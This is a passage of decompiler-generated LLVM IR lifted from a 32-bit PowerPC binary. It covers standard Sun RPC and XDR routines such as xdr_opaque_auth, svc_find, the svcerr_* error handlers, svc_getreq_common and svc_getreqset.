  %v3_10023264 = icmp eq i32 %v0_10023260, 0
  br i1 %v3_10023264, label %dec_label_pc_100232a4, label %dec_label_pc_1002326c

dec_label_pc_1002326c:                            ; preds = %dec_label_pc_10023260
  %v0_1002326c = load i32, i32* @r31, align 4
  %v1_1002326c = add i32 %v0_1002326c, 4
  %v2_1002326c = inttoptr i32 %v1_1002326c to i32*
  %v3_1002326c = load i32, i32* %v2_1002326c, align 4
  %v3_1002327c = icmp eq i32 %v3_1002326c, 1
  br i1 %v3_1002327c, label %dec_label_pc_10023290, label %dec_label_pc_100232a4

dec_label_pc_10023290:                            ; preds = %dec_label_pc_1002326c
  %v1_10023284 = add i32 %v0_1002326c, 8
  %v1_10023278 = add i32 %v0_1002326c, 12
  %v0_10023274 = load i32, i32* @r30, align 4
  store i32 %v0_10023234, i32* @lr, align 4
  %v5_100232a0 = inttoptr i32 %v1_10023284 to i32*
  %v6_100232a0 = call i32 @xdr_union(i32 %v0_10023274, i32* %v5_100232a0, i32 %v1_10023278, i32 ptrtoint (i32* @global_var_1002fa6c.1311 to i32), i32 0)
  br label %dec_label_pc_100232a4

dec_label_pc_100232a4:                            ; preds = %dec_label_pc_1002326c, %dec_label_pc_10023260, %entry, %dec_label_pc_10023290
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1002326c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100232a4, { 3, 0, 1, 2 }
}

define i32 @xdr_des_block() local_unnamed_addr {
entry:
  store i32 8, i32* @r5, align 4
  %v2_100232c0 = call i32 @xdr_opaque(i32* inttoptr (i32 8 to i32*))
  ret i32 %v2_100232c0
}

define i32 @xdr_opaque_auth() local_unnamed_addr {
entry:
  %v0_100232c4 = load i32, i32* @lr, align 4
  %v0_100232d0 = load i32, i32* @r4, align 4
  %v0_100232d8 = load i32, i32* @r3, align 4
  store i32 %v0_100232d8, i32* @r31, align 4
  store i32 268579552, i32* @lr, align 4
  %v0_100232dc = call i32 @xdr_enum()
  %v3_100232e4 = icmp eq i32 %v0_100232dc, 0
  br i1 %v3_100232e4, label %dec_label_pc_1002330c, label %dec_label_pc_100232f4

dec_label_pc_100232f4:                            ; preds = %entry
  %v1_100232e8 = add i32 %v0_100232d0, 4
  %v1_100232e0 = add i32 %v0_100232d0, 8
  %v0_100232f8 = load i32, i32* @r31, align 4
  store i32 %v0_100232c4, i32* @lr, align 4
  %v4_10023308 = inttoptr i32 %v0_100232f8 to i32*
  %v5_10023308 = call i32 @xdr_bytes(i32* %v4_10023308, i32 %v1_100232e8, i32 %v1_100232e0, i32 400)
  br label %dec_label_pc_1002330c

dec_label_pc_1002330c:                            ; preds = %entry, %dec_label_pc_100232f4
  %v0_1002331c = phi i32 [ 0, %entry ], [ %v5_10023308, %dec_label_pc_100232f4 ]
  ret i32 %v0_1002331c

; uselistorder directives
  uselistorder label %dec_label_pc_1002330c, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10023320 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 268579644, i32* @lr, align 4
  %v0_10023338 = call i32 @xdr_opaque_auth()
  %v3_10023340 = icmp eq i32 %v0_10023338, 0
  %v0_10023344 = load i32, i32* @r30, align 4
  store i32 %v0_10023344, i32* @r3, align 4
  br i1 %v3_10023340, label %dec_label_pc_100233c4, label %dec_label_pc_1002334c

dec_label_pc_1002334c:                            ; preds = %entry
  store i32 268579664, i32* @lr, align 4
  %v0_1002334c = call i32 @xdr_enum()
  store i32 %v0_1002334c, i32* %r3.global-to-local, align 4
  %v3_10023350 = icmp eq i32 %v0_1002334c, 0
  br i1 %v3_10023350, label %dec_label_pc_100233c4, label %dec_label_pc_10023358

dec_label_pc_10023358:                            ; preds = %dec_label_pc_1002334c
  %v0_10023358 = load i32, i32* @r31, align 4
  %v1_10023358 = add i32 %v0_10023358, 12
  %v2_10023358 = inttoptr i32 %v1_10023358 to i32*
  %v3_10023358 = load i32, i32* %v2_10023358, align 4
  %v0_1002335c = load i32, i32* @r30, align 4
  store i32 %v0_1002335c, i32* %r3.global-to-local, align 4
  %v3_10023360 = icmp eq i32 %v3_10023358, 0
  br i1 %v3_10023360, label %dec_label_pc_10023378, label %dec_label_pc_10023370

dec_label_pc_10023370:                            ; preds = %dec_label_pc_10023358
  %v3_10023364 = icmp eq i32 %v3_10023358, 2
  br i1 %v3_10023364, label %dec_label_pc_10023394, label %dec_label_pc_100233c8

dec_label_pc_10023378:                            ; preds = %dec_label_pc_10023358
  %v1_1002337c = add i32 %v0_10023358, 20
  %v2_1002337c = inttoptr i32 %v1_1002337c to i32*
  %v3_1002337c = load i32, i32* %v2_1002337c, align 4
  call void @__pseudo_call(i32 %v3_1002337c)
  %v0_1002338c = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100233c8

dec_label_pc_10023394:                            ; preds = %dec_label_pc_10023370
  %v1_10023394 = add i32 %v0_10023358, 16
  store i32 %v1_10023394, i32* @r4, align 4
  store i32 %v0_1002335c, i32* @r3, align 4
  store i32 268579744, i32* @lr, align 4
  %v0_1002339c = call i32 @xdr_u_long()
  %v0_100233a0 = load i32, i32* @r31, align 4
  %v1_100233a0 = add i32 %v0_100233a0, 20
  store i32 %v1_100233a0, i32* @r4, align 4
  %v3_100233a4 = icmp eq i32 %v0_1002339c, 0
  %v0_100233a8 = load i32, i32* @r30, align 4
  store i32 %v0_100233a8, i32* @r3, align 4
  br i1 %v3_100233a4, label %dec_label_pc_100233c4, label %dec_label_pc_100233b0

dec_label_pc_100233b0:                            ; preds = %dec_label_pc_10023394
  store i32 %v0_10023320, i32* @lr, align 4
  %v0_100233c0 = call i32 @xdr_u_long()
  store i32 %v0_100233c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100233c4

dec_label_pc_100233c4:                            ; preds = %dec_label_pc_10023394, %dec_label_pc_1002334c, %entry, %dec_label_pc_100233b0
  br label %dec_label_pc_100233c8

dec_label_pc_100233c8:                            ; preds = %dec_label_pc_10023370, %dec_label_pc_10023378, %dec_label_pc_100233c4
  %v0_100233c8 = phi i32 [ 1, %dec_label_pc_10023370 ], [ %v0_1002338c, %dec_label_pc_10023378 ], [ 0, %dec_label_pc_100233c4 ]
  store i32 %v0_100233c8, i32* %r3.global-to-local, align 4
  ret i32 %v0_100233c8

; uselistorder directives
  uselistorder i32 %v0_100233c8, { 1, 0 }
  uselistorder i32 %v0_10023358, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100233c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100233c4, { 3, 0, 1, 2 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10023424 = add i32 %arg1, 8
  %v2_10023424 = inttoptr i32 %v1_10023424 to i32*
  %v3_10023424 = load i32, i32* %v2_10023424, align 4
  %v1_10023428 = add i32 %v3_10023424, 12
  %v2_10023428 = inttoptr i32 %v1_10023428 to i32*
  %v3_10023428 = load i32, i32* %v2_10023428, align 4
  call void @__pseudo_call(i32 %v3_10023428)
  ret i32 %arg1
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10023480 = add i32 %arg1, 8
  %v2_10023480 = inttoptr i32 %v1_10023480 to i32*
  %v3_10023480 = load i32, i32* %v2_10023480, align 4
  %v1_10023484 = add i32 %v3_10023480, 12
  %v2_10023484 = inttoptr i32 %v1_10023484 to i32*
  %v3_10023484 = load i32, i32* %v2_10023484, align 4
  call void @__pseudo_call(i32 %v3_10023484)
  ret i32 %arg1
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100234d8 = add i32 %arg1, 8
  %v2_100234d8 = inttoptr i32 %v1_100234d8 to i32*
  %v3_100234d8 = load i32, i32* %v2_100234d8, align 4
  %v1_100234dc = add i32 %v3_100234d8, 12
  %v2_100234dc = inttoptr i32 %v1_100234dc to i32*
  %v3_100234dc = load i32, i32* %v2_100234dc, align 4
  call void @__pseudo_call(i32 %v3_100234dc)
  ret i32 %arg1
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10023530 = add i32 %arg1, 8
  %v2_10023530 = inttoptr i32 %v1_10023530 to i32*
  %v3_10023530 = load i32, i32* %v2_10023530, align 4
  %v1_10023534 = add i32 %v3_10023530, 12
  %v2_10023534 = inttoptr i32 %v1_10023534 to i32*
  %v3_10023534 = load i32, i32* %v2_10023534, align 4
  call void @__pseudo_call(i32 %v3_10023534)
  ret i32 %arg1
}

define i32 @svcerr_auth(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10023574 = add i32 %arg1, 8
  %v2_10023574 = inttoptr i32 %v1_10023574 to i32*
  %v3_10023574 = load i32, i32* %v2_10023574, align 4
  %v1_10023578 = add i32 %v3_10023574, 12
  %v2_10023578 = inttoptr i32 %v1_10023578 to i32*
  %v3_10023578 = load i32, i32* %v2_10023578, align 4
  call void @__pseudo_call(i32 %v3_10023578)
  ret i32 %arg1
}

define i32 @svcerr_weakauth() local_unnamed_addr {
entry:
  %v1_10023598 = call i32 @svcerr_auth(i32 5)
  ret i32 %v1_10023598
}

define i32 @__GI_svcerr_noprog(i32 %arg1) local_unnamed_addr {
entry:
  store i32 1, i32* @r10, align 4
  %v1_100235d0 = add i32 %arg1, 8
  %v2_100235d0 = inttoptr i32 %v1_100235d0 to i32*
  %v3_100235d0 = load i32, i32* %v2_100235d0, align 4
  %v1_100235d4 = add i32 %v3_100235d0, 12
  %v2_100235d4 = inttoptr i32 %v1_100235d4 to i32*
  %v3_100235d4 = load i32, i32* %v2_100235d4, align 4
  call void @__pseudo_call(i32 %v3_100235d4)
  ret i32 %arg1
}

define i32 @svcerr_progvers(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1002360c = load i32, i32* @r5, align 4
  store i32 %v0_1002360c, i32* @r29, align 4
  %v1_10023638 = add i32 %arg1, 8
  %v2_10023638 = inttoptr i32 %v1_10023638 to i32*
  %v3_10023638 = load i32, i32* %v2_10023638, align 4
  %v1_1002363c = add i32 %v3_10023638, 12
  %v2_1002363c = inttoptr i32 %v1_1002363c to i32*
  %v3_1002363c = load i32, i32* %v2_1002363c, align 4
  call void @__pseudo_call(i32 %v3_1002363c)
  ret i32 %arg1
}

define i32 @svc_find(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v0_10023670 = load i32, i32* @r4, align 4
  store i32 %v0_10023670, i32* @r31, align 4
  %v0_10023674 = load i32, i32* @r5, align 4
  store i32 %v0_10023674, i32* @r30, align 4
  store i32 268580476, i32* @lr, align 4
  %v0_10023678 = call i32 @__rpc_thread_variables()
  store i32 %v0_10023678, i32* %r3.global-to-local, align 4
  %v1_1002367c = add i32 %v0_10023678, 184
  %v2_1002367c = inttoptr i32 %v1_1002367c to i32*
  %v3_1002367c = load i32, i32* %v2_1002367c, align 4
  store i32 %v3_1002367c, i32* %r3.global-to-local, align 4
  %v3_100236a83 = icmp eq i32 %v3_1002367c, 0
  br i1 %v3_100236a83, label %dec_label_pc_100236b0, label %dec_label_pc_10023688.lr.ph

dec_label_pc_10023688.lr.ph:                      ; preds = %entry
  %v1_1002368c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10023688

dec_label_pc_10023688:                            ; preds = %dec_label_pc_10023688.lr.ph, %dec_label_pc_100236a0
  %v0_100236b06 = phi i32 [ 0, %dec_label_pc_10023688.lr.ph ], [ %v0_100236a0, %dec_label_pc_100236a0 ]
  %v0_100236a0 = phi i32 [ %v3_1002367c, %dec_label_pc_10023688.lr.ph ], [ %v2_100236a4, %dec_label_pc_100236a0 ]
  %v1_10023688 = add i32 %v0_100236a0, 4
  %v2_10023688 = inttoptr i32 %v1_10023688 to i32*
  %v3_10023688 = load i32, i32* %v2_10023688, align 4
  %v4_1002368c = icmp eq i32 %v3_10023688, %v1_1002368c.pre
  br i1 %v4_1002368c, label %dec_label_pc_10023694, label %dec_label_pc_100236a0

dec_label_pc_10023694:                            ; preds = %dec_label_pc_10023688
  %v1_10023694 = add i32 %v0_100236a0, 8
  %v2_10023694 = inttoptr i32 %v1_10023694 to i32*
  %v3_10023694 = load i32, i32* %v2_10023694, align 4
  %v1_10023698 = load i32, i32* @r31, align 4
  %v4_10023698 = icmp eq i32 %v3_10023694, %v1_10023698
  br i1 %v4_10023698, label %dec_label_pc_10023694.dec_label_pc_100236b0_crit_edge, label %dec_label_pc_100236a0

dec_label_pc_100236a0:                            ; preds = %dec_label_pc_10023688, %dec_label_pc_10023694
  %v1_100236a4 = inttoptr i32 %v0_100236a0 to i32*
  %v2_100236a4 = load i32, i32* %v1_100236a4, align 4
  store i32 %v2_100236a4, i32* %r3.global-to-local, align 4
  %v3_100236a8 = icmp eq i32 %v2_100236a4, 0
  br i1 %v3_100236a8, label %dec_label_pc_100236a8.dec_label_pc_100236b0_crit_edge, label %dec_label_pc_10023688

dec_label_pc_100236a8.dec_label_pc_100236b0_crit_edge: ; preds = %dec_label_pc_100236a0
  br label %dec_label_pc_100236b0

dec_label_pc_10023694.dec_label_pc_100236b0_crit_edge: ; preds = %dec_label_pc_10023694
  br label %dec_label_pc_100236b0

dec_label_pc_100236b0:                            ; preds = %dec_label_pc_10023694.dec_label_pc_100236b0_crit_edge, %dec_label_pc_100236a8.dec_label_pc_100236b0_crit_edge, %entry
  %v0_100236b0 = phi i32 [ %v0_100236b06, %dec_label_pc_10023694.dec_label_pc_100236b0_crit_edge ], [ %v0_100236a0, %dec_label_pc_100236a8.dec_label_pc_100236b0_crit_edge ], [ 0, %entry ]
  %v1_100236b0 = load i32, i32* @r30, align 4
  %v2_100236b0 = inttoptr i32 %v1_100236b0 to i32*
  store i32 %v0_100236b0, i32* %v2_100236b0, align 4
  %v0_100236c4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100236c4

; uselistorder directives
  uselistorder i32 %v2_100236a4, { 1, 2, 0 }
  uselistorder i32 %v0_100236a0, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_100236a0, { 1, 0 }
  uselistorder label %dec_label_pc_10023688, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1304 = alloca i32, align 4
  %stack_var_-1292 = alloca i32, align 4
  %stack_var_-1248 = alloca i32, align 4
  %stack_var_-1272 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268580592, i32* @lr, align 4
  %v0_100236ec = call i32 @__rpc_thread_variables()
  %v1_100236f0 = add i32 %v0_100236ec, 180
  %v2_100236f0 = inttoptr i32 %v1_100236f0 to i32*
  %v3_100236f0 = load i32, i32* %v2_100236f0, align 4
  %v0_100236f4 = load i32, i32* @r29, align 4
  %v1_100236f4 = mul i32 %v0_100236f4, 4
  store i32 %v0_100236ec, i32* @r30, align 4
  %v2_100236fc = add i32 %v1_100236f4, %v3_100236f0
  %v3_100236fc = inttoptr i32 %v2_100236fc to i32*
  %v4_100236fc = load i32, i32* %v3_100236fc, align 4
  store i32 %v4_100236fc, i32* @r29, align 4
  %v3_10023700 = icmp eq i32 %v4_100236fc, 0
  br i1 %v3_10023700, label %dec_label_pc_10023878, label %dec_label_pc_10023708.preheader

dec_label_pc_10023708.preheader:                  ; preds = %entry
  %v2_1002370c = ptrtoint i32* %stack_var_-1272 to i32
  %v2_10023744 = ptrtoint i32* %stack_var_-1292 to i32
  %v2_10023820 = ptrtoint i32* %stack_var_-1304 to i32
  br label %dec_label_pc_10023708

dec_label_pc_10023708:                            ; preds = %dec_label_pc_10023870.dec_label_pc_10023708_crit_edge, %dec_label_pc_10023708.preheader
  %v0_10023708 = phi i32 [ %v0_10023708.pre, %dec_label_pc_10023870.dec_label_pc_10023708_crit_edge ], [ %v4_100236fc, %dec_label_pc_10023708.preheader ]
  %v1_10023708 = add i32 %v0_10023708, 8
  %v2_10023708 = inttoptr i32 %v1_10023708 to i32*
  %v3_10023708 = load i32, i32* %v2_10023708, align 4
  store i32 %v2_1002370c, i32* @r31, align 4
  %v1_10023718 = inttoptr i32 %v3_10023708 to i32*
  %v2_10023718 = load i32, i32* %v1_10023718, align 4
  call void @__pseudo_call(i32 %v2_10023718)
  %v3_10023724 = icmp eq i32 %v0_10023708, 0
  br i1 %v3_10023724, label %dec_label_pc_1002383c, label %dec_label_pc_1002372c

dec_label_pc_1002372c:                            ; preds = %dec_label_pc_10023708
  %v3_10023730 = load i32, i32* %stack_var_-1248, align 4
  store i32 %v3_10023730, i32* %r10.global-to-local, align 4
  %v3_10023740 = icmp eq i32 %v3_10023730, 0
  %v0_10023748 = load i32, i32* @r29, align 4
  br i1 %v3_10023740, label %dec_label_pc_1002376c, label %dec_label_pc_10023784

dec_label_pc_1002376c:                            ; preds = %dec_label_pc_1002372c
  %v3_10023770 = load i32, i32* @global_var_1004eed8.1298, align 4
  %v2_10023774 = add i32 %v0_10023748, 32
  %v3_10023774 = inttoptr i32 %v2_10023774 to i32*
  store i32 %v3_10023770, i32* %v3_10023774, align 4
  %v0_1002377c = load i32, i32* %r10.global-to-local, align 4
  %v2_1002377c = add i32 %v0_10023748, 40
  %v3_1002377c = inttoptr i32 %v2_1002377c to i32*
  store i32 %v0_1002377c, i32* %v3_1002377c, align 4
  br label %dec_label_pc_100237a8

dec_label_pc_10023784:                            ; preds = %dec_label_pc_1002372c
  store i32 268580752, i32* @lr, align 4
  %v3_1002378c = call i32 @_authenticate(i32 %v2_10023820, i32 %v2_1002370c, i32 %v2_10023744)
  %v3_10023790 = icmp eq i32 %v3_1002378c, 0
  br i1 %v3_10023790, label %dec_label_pc_100237a8, label %dec_label_pc_10023798

dec_label_pc_10023798:                            ; preds = %dec_label_pc_10023784
  %v0_1002379c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_100237a4.1312 to i32), i32* @lr, align 4
  %v2_100237a0 = call i32 @svcerr_auth(i32 %v0_1002379c)
  br label %dec_label_pc_1002383c

dec_label_pc_100237a8:                            ; preds = %dec_label_pc_10023784, %dec_label_pc_1002376c
  %v0_100237a8 = load i32, i32* @r30, align 4
  %v1_100237a8 = add i32 %v0_100237a8, 184
  %v2_100237a8 = inttoptr i32 %v1_100237a8 to i32*
  %v3_100237a8 = load i32, i32* %v2_100237a8, align 4
  %v3_100237b0 = load i32, i32* %stack_var_-1304, align 4
  store i32 %v3_100237b0, i32* @r8, align 4
  store i32 0, i32* @r5, align 4
  store i32 %tmp20, i32* @r10, align 4
  %v3_100238003 = icmp eq i32 %v3_100237a8, 0
  br i1 %v3_100238003, label %dec_label_pc_10023808, label %dec_label_pc_100237c4

dec_label_pc_100237c4:                            ; preds = %dec_label_pc_100237a8, %dec_label_pc_100237fc
  %v0_1002380815 = phi i32 [ %v0_1002380814, %dec_label_pc_100237fc ], [ 0, %dec_label_pc_100237a8 ]
  %v1_100237e0 = phi i32 [ %v1_100237e013, %dec_label_pc_100237fc ], [ 0, %dec_label_pc_100237a8 ]
  %v0_100237dc = phi i32 [ %v0_100237dc10, %dec_label_pc_100237fc ], [ -1, %dec_label_pc_100237a8 ]
  %v0_1002381c = phi i32 [ %v2_100237fc, %dec_label_pc_100237fc ], [ %v3_100237a8, %dec_label_pc_100237a8 ]
  %v1_100237c4 = add i32 %v0_1002381c, 4
  %v2_100237c4 = inttoptr i32 %v1_100237c4 to i32*
  %v3_100237c4 = load i32, i32* %v2_100237c4, align 4
  %v4_100237c8 = icmp eq i32 %v3_100237c4, %v3_100237b0
  br i1 %v4_100237c8, label %dec_label_pc_100237d0, label %dec_label_pc_100237fc

dec_label_pc_100237d0:                            ; preds = %dec_label_pc_100237c4
  %v1_100237d0 = add i32 %v0_1002381c, 8
  %v2_100237d0 = inttoptr i32 %v1_100237d0 to i32*
  %v3_100237d0 = load i32, i32* %v2_100237d0, align 4
  %v4_100237d8 = icmp eq i32 %v3_100237d0, %tmp20
  br i1 %v4_100237d8, label %dec_label_pc_1002381c, label %dec_label_pc_100237e8

dec_label_pc_100237e8:                            ; preds = %dec_label_pc_100237d0
  %v3_100237dc = icmp ugt i32 %v0_100237dc, %v3_100237d0
  br i1 %v3_100237dc, label %dec_label_pc_100237ec, label %dec_label_pc_100237f0

dec_label_pc_100237ec:                            ; preds = %dec_label_pc_100237e8
  br label %dec_label_pc_100237f0

dec_label_pc_100237f0:                            ; preds = %dec_label_pc_100237e8, %dec_label_pc_100237ec
  %v0_100237dc11 = phi i32 [ %v0_100237dc, %dec_label_pc_100237e8 ], [ %v3_100237d0, %dec_label_pc_100237ec ]
  %tmp37 = icmp ugt i32 %v3_100237d0, %v1_100237e0
  br i1 %tmp37, label %dec_label_pc_100237f4, label %dec_label_pc_100237fc

dec_label_pc_100237f4:                            ; preds = %dec_label_pc_100237f0
  store i32 %v3_100237d0, i32* @r5, align 4
  br label %dec_label_pc_100237fc

dec_label_pc_100237fc:                            ; preds = %dec_label_pc_100237f0, %dec_label_pc_100237c4, %dec_label_pc_100237f4
  %v0_1002380814 = phi i32 [ %v0_1002380815, %dec_label_pc_100237c4 ], [ 1, %dec_label_pc_100237f0 ], [ 1, %dec_label_pc_100237f4 ]
  %v1_100237e013 = phi i32 [ %v1_100237e0, %dec_label_pc_100237c4 ], [ %v1_100237e0, %dec_label_pc_100237f0 ], [ %v3_100237d0, %dec_label_pc_100237f4 ]
  %v0_100237dc10 = phi i32 [ %v0_100237dc, %dec_label_pc_100237c4 ], [ %v0_100237dc11, %dec_label_pc_100237f0 ], [ %v0_100237dc11, %dec_label_pc_100237f4 ]
  %v1_100237fc = inttoptr i32 %v0_1002381c to i32*
  %v2_100237fc = load i32, i32* %v1_100237fc, align 4
  %v3_10023800 = icmp eq i32 %v2_100237fc, 0
  br i1 %v3_10023800, label %dec_label_pc_10023800.dec_label_pc_10023808_crit_edge, label %dec_label_pc_100237c4

dec_label_pc_10023800.dec_label_pc_10023808_crit_edge: ; preds = %dec_label_pc_100237fc
  br label %dec_label_pc_10023808

dec_label_pc_10023808:                            ; preds = %dec_label_pc_10023800.dec_label_pc_10023808_crit_edge, %dec_label_pc_100237a8
  %v0_10023808 = phi i32 [ %v0_1002380814, %dec_label_pc_10023800.dec_label_pc_10023808_crit_edge ], [ 0, %dec_label_pc_100237a8 ]
  %v3_10023808 = icmp eq i32 %v0_10023808, 0
  %v0_10023834 = load i32, i32* @r29, align 4
  br i1 %v3_10023808, label %dec_label_pc_10023834, label %dec_label_pc_10023810

dec_label_pc_10023810:                            ; preds = %dec_label_pc_10023808
  store i32 ptrtoint (i32* @global_var_10023818.1313 to i32), i32* @lr, align 4
  %v1_10023814 = call i32 @svcerr_progvers(i32 %v0_10023834)
  br label %dec_label_pc_1002383c

dec_label_pc_1002381c:                            ; preds = %dec_label_pc_100237d0
  %v1_1002381c = add i32 %v0_1002381c, 12
  %v2_1002381c = inttoptr i32 %v1_1002381c to i32*
  %v3_1002381c = load i32, i32* %v2_1002381c, align 4
  call void @__pseudo_call(i32 %v3_1002381c)
  br label %dec_label_pc_1002383c

dec_label_pc_10023834:                            ; preds = %dec_label_pc_10023808
  store i32 268580924, i32* @lr, align 4
  %v1_10023838 = call i32 @__GI_svcerr_noprog(i32 %v0_10023834)
  br label %dec_label_pc_1002383c

dec_label_pc_1002383c:                            ; preds = %dec_label_pc_10023708, %dec_label_pc_1002381c, %dec_label_pc_10023810, %dec_label_pc_10023798, %dec_label_pc_10023834
  %v0_1002383c = load i32, i32* @r29, align 4
  %v1_1002383c = add i32 %v0_1002383c, 8
  %v2_1002383c = inttoptr i32 %v1_1002383c to i32*
  %v3_1002383c = load i32, i32* %v2_1002383c, align 4
  %v1_10023844 = add i32 %v3_1002383c, 4
  %v2_10023844 = inttoptr i32 %v1_10023844 to i32*
  %v3_10023844 = load i32, i32* %v2_10023844, align 4
  call void @__pseudo_call(i32 %v3_10023844)
  %v3_10023850 = icmp eq i32 %v0_1002383c, 0
  br i1 %v3_10023850, label %dec_label_pc_10023858, label %dec_label_pc_10023870

dec_label_pc_10023858:                            ; preds = %dec_label_pc_1002383c
  %v0_10023858 = load i32, i32* @r29, align 4
  %v1_10023858 = add i32 %v0_10023858, 8
  %v2_10023858 = inttoptr i32 %v1_10023858 to i32*
  %v3_10023858 = load i32, i32* %v2_10023858, align 4
  %v1_10023860 = add i32 %v3_10023858, 20
  %v2_10023860 = inttoptr i32 %v1_10023860 to i32*
  %v3_10023860 = load i32, i32* %v2_10023860, align 4
  call void @__pseudo_call(i32 %v3_10023860)
  br label %dec_label_pc_10023878

dec_label_pc_10023870:                            ; preds = %dec_label_pc_1002383c
  %v3_10023870 = icmp eq i32 %v0_1002383c, 1
  br i1 %v3_10023870, label %dec_label_pc_10023870.dec_label_pc_10023708_crit_edge, label %dec_label_pc_10023878

dec_label_pc_10023870.dec_label_pc_10023708_crit_edge: ; preds = %dec_label_pc_10023870
  %v0_10023708.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10023708

dec_label_pc_10023878:                            ; preds = %dec_label_pc_10023870, %entry, %dec_label_pc_10023858
  %v0_10023888 = phi i32 [ %v0_100236ec, %entry ], [ %v0_10023858, %dec_label_pc_10023858 ], [ %v0_1002383c, %dec_label_pc_10023870 ]
  ret i32 %v0_10023888

; uselistorder directives
  uselistorder i32 %v0_1002383c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10023834, { 1, 0 }
  uselistorder i32 %v2_100237fc, { 1, 0 }
  uselistorder i32 %v3_100237d0, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v0_100237dc, { 2, 1, 0 }
  uselistorder i32 %v1_100237e0, { 1, 2, 0 }
  uselistorder i32 %v0_10023748, { 1, 0 }
  uselistorder label %dec_label_pc_10023878, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1002383c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_100237fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100237f0, { 1, 0 }
  uselistorder label %dec_label_pc_100237c4, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r29, align 4
  store i32 268581028, i32* @lr, align 4
  %v0_100238a0 = call i32 @_rpc_dtablesize()
  store i32 %v0_100238a0, i32* @r27, align 4
  store i32 0, i32* @r28, align 4
  %v2_100238ec3 = icmp sgt i32 %v0_100238a0, 0
  br i1 %v2_100238ec3, label %dec_label_pc_100238b0.lr.ph, label %dec_label_pc_100238f4

dec_label_pc_100238b0.lr.ph:                      ; preds = %entry
  %v0_100238b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100238b0

dec_label_pc_100238b0:                            ; preds = %dec_label_pc_100238b0.lr.ph, %dec_label_pc_100238e4
  %v0_100238b0 = phi i32 [ %v0_100238b0.pre, %dec_label_pc_100238b0.lr.ph ], [ %v1_100238e4, %dec_label_pc_100238e4 ]
  %v1_100238b0 = inttoptr i32 %v0_100238b0 to i32*
  %v2_100238b0 = load i32, i32* %v1_100238b0, align 4
  store i32 %v2_100238b0, i32* @r31, align 4
  %v1_100238d011 = call i32 @ffs(i32 %v2_100238b0)
  %v3_100238d412 = icmp eq i32 %v1_100238d011, 0
  %v0_100238d813 = load i32, i32* @r28, align 4
  %v2_100238d814 = add i32 %v1_100238d011, -1
  %v1_100238dc15 = add i32 %v2_100238d814, %v0_100238d813
  br i1 %v3_100238d412, label %dec_label_pc_100238e4, label %dec_label_pc_100238b8

dec_label_pc_100238b8:                            ; preds = %dec_label_pc_100238b0, %dec_label_pc_100238b8
  %v1_100238dc16 = phi i32 [ %v1_100238dc, %dec_label_pc_100238b8 ], [ %v1_100238dc15, %dec_label_pc_100238b0 ]
  store i32 268581052, i32* @lr, align 4
  %v1_100238b8 = call i32 @svc_getreq_common(i32 %v1_100238dc16)
  %v0_100238bc = load i32, i32* @r30, align 4
  %v1_100238bc = add i32 %v0_100238bc, -1
  %v2_100238c4 = urem i32 %v1_100238bc, 64
  %v3_100238c4 = shl i32 1, %v2_100238c4
  %v0_100238c8 = load i32, i32* @r31, align 4
  %v2_100238c8 = xor i32 %v3_100238c4, %v0_100238c8
  store i32 %v2_100238c8, i32* @r31, align 4
  %v1_100238d0 = call i32 @ffs(i32 %v2_100238c8)
  %v3_100238d4 = icmp eq i32 %v1_100238d0, 0
  %v0_100238d8 = load i32, i32* @r28, align 4
  %v2_100238d8 = add i32 %v1_100238d0, -1
  %v1_100238dc = add i32 %v2_100238d8, %v0_100238d8
  br i1 %v3_100238d4, label %dec_label_pc_100238e4, label %dec_label_pc_100238b8

dec_label_pc_100238e4:                            ; preds = %dec_label_pc_100238b8, %dec_label_pc_100238b0
  %v0_100238d8.lcssa = phi i32 [ %v0_100238d813, %dec_label_pc_100238b0 ], [ %v0_100238d8, %dec_label_pc_100238b8 ]
  %v1_100238dc.lcssa = phi i32 [ %v1_100238dc15, %dec_label_pc_100238b0 ], [ %v1_100238dc, %dec_label_pc_100238b8 ]
  %v0_100238e4 = load i32, i32* @r29, align 4
  %v1_100238e4 = add i32 %v0_100238e4, 4
  store i32 %v1_100238e4, i32* @r29, align 4
  %v1_100238e8 = add i32 %v0_100238d8.lcssa, 32
  store i32 %v1_100238e8, i32* @r28, align 4
